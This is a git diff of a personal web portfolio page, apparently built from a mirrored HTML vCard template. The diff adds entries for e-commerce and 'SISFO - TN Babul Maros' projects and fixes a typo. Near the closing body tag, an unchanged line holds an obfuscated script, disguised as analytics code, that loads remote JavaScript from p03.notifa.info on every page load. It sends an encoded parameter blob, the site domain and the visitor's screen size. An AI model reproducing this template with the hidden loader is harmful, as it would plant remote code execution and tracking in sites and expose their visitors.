@@ -1,6 +1,5 @@
 hello fakinggg freen, i will apdett later .. .
 
-
 <!DOCTYPE html>
 <html lang="en" class="no-js">
 
@@ -669,7 +668,85 @@ hello fakinggg freen, i will apdett later .. .
                     <a href="images/portfolio/full/ajang3.jpg" class="lightbox" title="home page">
                       <img src="images/portfolio/ajang3.jpg" alt="">
                       <div>
-                        <h5 class="name">Web Profle - Desa Ajang Pulu</h5>
+                        <h5 class="name">Web Profile - Desa Ajang Pulu</h5>
+                        <small>web</small>
+                        <i class="pe-7s-icon pe-7s-photo"></i>
+                      </div>
+                    </a>
+                  </figure>
+                  <!-- /Portfolio Item 3 -->
+
+                  <!-- Portfolio Item 3 -->
+                  <figure class="item" data-groups='["all","illustration"]'>
+                    <a href="images/portfolio/full/ecom1.jpg" class="lightbox" title="checkout page">
+                      <img src="images/portfolio/ecom1.jpg" alt="">
+                      <div>
+                        <h5 class="name">E-Commerce</h5>
+                        <small>web</small>
+                        <i class="pe-7s-icon pe-7s-photo"></i>
+                      </div>
+                    </a>
+                  </figure>
+                  <!-- /Portfolio Item 3 -->
+
+                  <!-- Portfolio Item 3 -->
+                  <figure class="item" data-groups='["all","illustration"]'>
+                    <a href="images/portfolio/full/ecom2.jpg" class="lightbox" title="customer o">
+                      <img src="images/portfolio/ecom2.jpg" alt="">
+                      <div>
+                        <h5 class="name">E-Commerce</h5>
+                        <small>web</small>
+                        <i class="pe-7s-icon pe-7s-photo"></i>
+                      </div>
+                    </a>
+                  </figure>
+                  <!-- /Portfolio Item 3 -->
+
+                  <!-- Portfolio Item 3 -->
+                  <figure class="item" data-groups='["all","illustration"]'>
+                    <a href="images/portfolio/full/ecom3.jpg" class="lightbox" title="input data with modal">
+                      <img src="images/portfolio/ecom3.jpg" alt="">
+                      <div>
+                        <h5 class="name">E-Commerce</h5>
+                        <small>web</small>
+                        <i class="pe-7s-icon pe-7s-photo"></i>
+                      </div>
+                    </a>
+                  </figure>
+                  <!-- /Portfolio Item 3 -->
+
+                  <!-- Portfolio Item 3 -->
+                  <figure class="item" data-groups='["all","illustration"]'>
+                    <a href="images/portfolio/full/babul1.jpg" class="lightbox" title="home page">
+                      <img src="images/portfolio/babul1.jpg" alt="">
+                      <div>
+                        <h5 class="name">SISFO - TN Babul Maros</h5>
+                        <small>web</small>
+                        <i class="pe-7s-icon pe-7s-photo"></i>
+                      </div>
+                    </a>
+                  </figure>
+                  <!-- /Portfolio Item 3 -->
+
+                  <!-- Portfolio Item 3 -->
+                  <figure class="item" data-groups='["all","illustration"]'>
+                    <a href="images/portfolio/full/babul2.jpg" class="lightbox" title="direct location with map">
+                      <img src="images/portfolio/babul2.jpg" alt="">
+                      <div>
+                        <h5 class="name">SISFO - TN Babul Maros</h5>
+                        <small>web</small>
+                        <i class="pe-7s-icon pe-7s-photo"></i>
+                      </div>
+                    </a>
+                  </figure>
+                  <!-- /Portfolio Item 3 -->
+
+                  <!-- Portfolio Item 3 -->
+                  <figure class="item" data-groups='["all","illustration"]'>
+                    <a href="images/portfolio/full/babul3.jpg" class="lightbox" title="post page picker loc">
+                      <img src="images/portfolio/babul3.jpg" alt="">
+                      <div>
+                        <h5 class="name">SISFO - TN Babul Maros</h5>
                         <small>web</small>
                         <i class="pe-7s-icon pe-7s-photo"></i>
                       </div>
@@ -819,4 +896,4 @@ hello fakinggg freen, i will apdett later .. .
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mvbetKY1OuaClDTLk37fJ0ADhAu9p49%2bG9pC6YQgqhUKiT%2bCNuy5c3IgYis9Gmhj5tvuoIAYzgaVUMExhKGYEyTl2AxL4ZN0WS5Kk9lJaLoaYnPeaPaw1JMiO9lhq2%2bPl%2beAU5NRPzkDS0Qh%2bEWCLokcA7dysqKPWWr%2bG%2bIl6jzviYDiUaUDqylJc8NbQdFD6%2bxLTQ0resDSrUn%2bGrdYPji1CMGaF2FamG%2fJgfnMrmGnpOx23MOCAMGXOC%2f0hk7cbmj4zETkD0gQPt92eWOpoltZLk8l85d%2f2EuCXqT5xWalwl2uJu3wUSbBtV66FfBjBRA1QD2Iu0M0apt1grY%2b49U7mYpmuJxQ8aFrcTTo6RPl6OmgTrzWdFblAV2yQk6VlOfh6LcWKvhkMbne7aHvUGK6kTN59R%2bAqdeDt90WI8oz6qd74vmkiUuTmDGq0cJ6akQcDFCsZzcl4ajYb5y4uGiePML44JzQHZBHCHfNUaXulzskej7fI4WEoUtc8qp2V" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from lmpixels.com/demo/unique/unique-vcard/index-light.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 Mar 2018 06:01:46 GMT -->
-</html> -->
+</html>
